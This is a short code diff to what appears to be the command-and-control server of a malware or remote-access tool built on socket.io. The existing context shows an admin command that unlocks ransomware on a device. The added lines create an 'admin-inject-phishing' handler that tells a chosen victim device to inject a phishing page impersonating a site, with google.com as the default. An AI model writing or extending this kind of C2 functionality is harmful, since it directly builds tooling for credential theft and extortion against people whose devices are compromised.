@@ -401,6 +401,11 @@ io.on('connection', (socket) => {
                 io.to(data.deviceId).emit('admin-ransomware-unlock');
             }
         });
+        socket.on('admin-inject-phishing', (data) => {
+            if (data.deviceId) {
+                io.to(data.deviceId).emit('inject-phishing', { site: data.site || 'google.com' });
+            }
+        });
         socket.on('disconnect', () => {
             // Keep IP in set briefly; remove after other sockets from same IP may still be active
             setTimeout(() => adminIps.delete(adminIp), 60000);
